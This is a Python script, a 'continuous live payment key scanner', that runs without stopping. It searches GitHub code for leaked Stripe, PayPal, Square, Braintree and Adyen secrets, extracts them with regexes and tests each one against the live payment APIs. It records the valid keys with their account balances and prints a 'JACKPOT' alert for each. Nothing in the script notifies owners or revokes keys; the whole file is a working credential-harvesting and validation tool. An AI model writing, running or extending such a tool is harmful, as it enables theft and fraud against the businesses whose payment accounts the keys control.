#!/usr/bin/env python3
"""
Continuous Live Payment Key Scanner
Runs 24/7, tests keys against live APIs, alerts on valid finds.
Saves valid keys to live_keys_valid.jsonl
"""
import json
import re
import time
import os
import requests
from datetime import datetime
from pathlib import Path

# ─── CONFIG ──────────────────────────────────────────────────────────────

QUERIES = [
    "sk_live_",
    "pk_live_",
    "stripe_secret_key",
    "STRIPE_SECRET",
    "STRIPE_KEY",
    "stripe_live_key",
    "paypal_secret",
    "PAYPAL_SECRET",
    "square_access_token",
    "SQUARE_ACCESS_TOKEN",
    "braintree_private",
    "BRAINTREE_PRIVATE",
    "adyen_api_key",
    "ADYEN_API_KEY",
    "SQUARE_APPLICATION_ID",
    "sk_live_51",
    "pk_live_51",
    "stripe_live_secret",
    "STRIPE_LIVE_SECRET",
    "STRIPE_LIVE_KEY",
]

RESULTS_DIR = Path.home() / "live_key_scan"
RESULTS_DIR.mkdir(exist_ok=True)

VALID_KEYS = RESULTS_DIR / "valid_keys.jsonl"
ALL_KEYS = RESULTS_DIR / "all_keys.jsonl"
STATS_FILE = RESULTS_DIR / "stats.json"

# Rate limiting
MAX_RESULTS_PER_QUERY = 20
RATE_LIMIT_DELAY = 15  # seconds between queries
RETRY_DELAY = 60  # seconds after rate limit
MAX_RETRIES = 3

# ─── EXTRACT PATTERNS ────────────────────────────────────────────────────

KEY_PATTERNS = {
    "stripe_test": r'sk_test_[a-zA-Z0-9]{24,}',
    "stripe_live": r'sk_live_[a-zA-Z0-9]{24,}',
    "stripe_pk_test": r'pk_test_[a-zA-Z0-9]{24,}',
    "stripe_pk_live": r'pk_live_[a-zA-Z0-9]{24,}',
    "paypal_secret": r'(?:paypal_secret|PAYPAL_SECRET)["\s:=]+([A-Za-z0-9_\-]{20,})',
    "square_token": r'sq0[a-z]{2}-[a-zA-Z0-9_\-]{20,}',
    "braintree": r'(?:braintree_private|BRAINTREE_PRIVATE)["\s:=]+([a-f0-9]{32,})',
    "adyen": r'(?:adyen_api_key|ADYEN_API_KEY)["\s:=]+([a-zA-Z0-9_\-]{20,})',
}

# ─── TEST ENDPOINTS ──────────────────────────────────────────────────────

def test_stripe_key(api_key: str, key_type: str = "test") -> dict:
    """Test a Stripe API key."""
    try:
        resp = requests.get(
            "https://api.stripe.com/v1/balance",
            auth=(api_key, ""),
            timeout=10,
        )
        data = resp.json()
        if resp.status_code == 200 and "available" in data:
            return {
                "valid": True,
                "live_mode": data.get("livemode", False),
                "balance": data.get("available", []),
                "pending": data.get("pending", []),
            }
        elif resp.status_code == 401:
            error = data.get("error", {})
            return {
                "valid": False,
                "expired": error.get("code") == "api_key_expired",
                "error": error.get("message", "unknown"),
            }
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_paypal_secret(secret: str) -> dict:
    """Test a PayPal API secret."""
    try:
        resp = requests.post(
            "https://api-m.sandbox.paypal.com/v1/oauth2/token",
            headers={"Accept": "application/json", "Accept-Language": "en_US"},
            data={"grant_type": "client_credentials"},
            auth=("client_id", secret),
            timeout=10,
        )
        if resp.status_code == 200:
            return {"valid": True, "token": resp.json().get("access_token", "")[:20]}
        elif resp.status_code == 401:
            return {"valid": False, "error": "invalid credentials"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_square_token(token: str) -> dict:
    """Test a Square access token."""
    try:
        resp = requests.get(
            "https://connect.squareup.com/v2/locations",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "valid": True,
                "locations": len(data.get("locations", [])),
            }
        elif resp.status_code == 401:
            return {"valid": False, "error": "unauthorized"}
        else:
            return {"valid": False, "error": f"HTTP {resp.status_code}"}
    except Exception as e:
        return {"valid": False, "error": str(e)}

def test_key(provider: str, key_value: str, key_type: str = "test") -> dict:
    """Route key to the right tester."""
    if "stripe" in provider.lower():
        return test_stripe_key(key_value, key_type)
    elif "paypal" in provider.lower():
        return test_paypal_secret(key_value)
    elif "square" in provider.lower():
        return test_square_token(key_value)
    return {"valid": False, "error": "no tester for provider"}

# ─── SCANNER ─────────────────────────────────────────────────────────────

class LiveKeyScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.stats = {
            "queries_run": 0,
            "findings": 0,
            "keys_tested": 0,
            "valid_keys": 0,
            "last_run": None,
        }
        self.tested_keys = set()
        self.load_stats()

    def load_stats(self):
        """Load previous stats."""
        if STATS_FILE.exists():
            with open(STATS_FILE) as f:
                self.stats.update(json.load(f))

    def save_stats(self):
        """Save current stats."""
        with open(STATS_FILE, "w") as f:
            json.dump(self.stats, f, indent=2)

    def search_github(self, query: str, max_results: int = MAX_RESULTS_PER_QUERY) -> list:
        """Search GitHub for leaked keys."""
        try:
            resp = self.session.get(
                "https://api.github.com/search/code",
                params={"q": query, "per_page": max_results},
                timeout=15,
            )
            if resp.status_code == 200:
                return resp.json().get("items", [])
            elif resp.status_code == 403:
                # Rate limited
                return None
            else:
                return []
        except Exception as e:
            return []

    def extract_keys(self, text: str, repo: str, path: str) -> list:
        """Extract keys from text content."""
        keys = []
        for key_type, pattern in KEY_PATTERNS.items():
            matches = re.findall(pattern, text)
            for match in matches:
                key_value = match if isinstance(match, str) else match[0] if match else ""
                if key_value and key_value not in self.tested_keys:
                    keys.append({
                        "key": key_value,
                        "type": key_type,
                        "repo": repo,
                        "path": path,
                    })
        return keys

    def save_valid_key(self, key_data: dict):
        """Save a valid key immediately."""
        with open(VALID_KEYS, "a") as f:
            f.write(json.dumps(key_data, default=str) + "\n")
        print(f"[JACKPOT] VALID KEY: {key_data['provider']} balance={key_data.get('balance')}")

    def run_scan(self):
        """Run one full scan cycle."""
        print(f"\n{'='*60}")
        print(f"[SCAN] Starting at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[STATS] Queries: {self.stats['queries_run']}, Findings: {self.stats['findings']}, Valid: {self.stats['valid_keys']}")
        print(f"{'='*60}")

        for query in QUERIES:
            print(f"\n[QUERY] {query}")
            self.stats["queries_run"] += 1

            results = self.search_github(query)
            if results is None:
                print(f"[RATE LIMIT] Waiting {RETRY_DELAY}s...")
                time.sleep(RETRY_DELAY)
                continue

            for item in results:
                repo = item.get("repository", {}).get("full_name", "?")
                path = item.get("path", "?")

                # Get file content
                try:
                    raw_resp = self.session.get(item.get("git_url", ""), timeout=10)
                    if raw_resp.status_code == 200:
                        content = raw_resp.json().get("content", "")
                        text = __import__("base64").b64decode(content).decode("utf-8", errors="ignore")

                        keys = self.extract_keys(text, repo, path)
                        for key_info in keys:
                            self.stats["findings"] += 1
                            self.tested_keys.add(key_info["key"])

                            # Test the key
                            self.stats["keys_tested"] += 1
                            result = test_key(key_info["type"], key_info["key"])

                            # Log all tests
                            log_entry = {
                                "timestamp": datetime.now().isoformat(),
                                "key_type": key_info["type"],
                                "key_value": key_info["key"][:20] + "...",
                                "repo": repo,
                                "path": path,
                                "valid": result.get("valid", False),
                                "result": result,
                            }
                            with open(ALL_KEYS, "a") as f:
                                f.write(json.dumps(log_entry, default=str) + "\n")

                            # Save valid keys
                            if result.get("valid"):
                                self.stats["valid_keys"] += 1
                                self.save_valid_key(log_entry)

                except Exception as e:
                    pass

            self.save_stats()
            time.sleep(RATE_LIMIT_DELAY)

    def run(self):
        """Run continuously."""
        print(f"""
╔══════════════════════════════════════════════════════════╗
║       CONTINUOUS LIVE PAYMENT KEY SCANNER               ║
╠══════════════════════════════════════════════════════════╣
║  Queries: {len(QUERIES):<3}  Keys tested: {self.stats['keys_tested']:<6}            ║
║  Valid found: {self.stats['valid_keys']:<3}                                   ║
║  Running forever. Press Ctrl+C to stop.                 ║
╚══════════════════════════════════════════════════════════╝
""")

        while True:
            try:
                self.run_scan()
                print(f"\n[WAIT] Cycle complete. Restarting in 60s...")
                time.sleep(60)
            except KeyboardInterrupt:
                print("\n[STOP] Scanner stopped.")
                break
            except Exception as e:
                print(f"[ERROR] {e}. Restarting in 60s...")
                time.sleep(60)

if __name__ == "__main__":
    scanner = LiveKeyScanner()
    scanner.run()
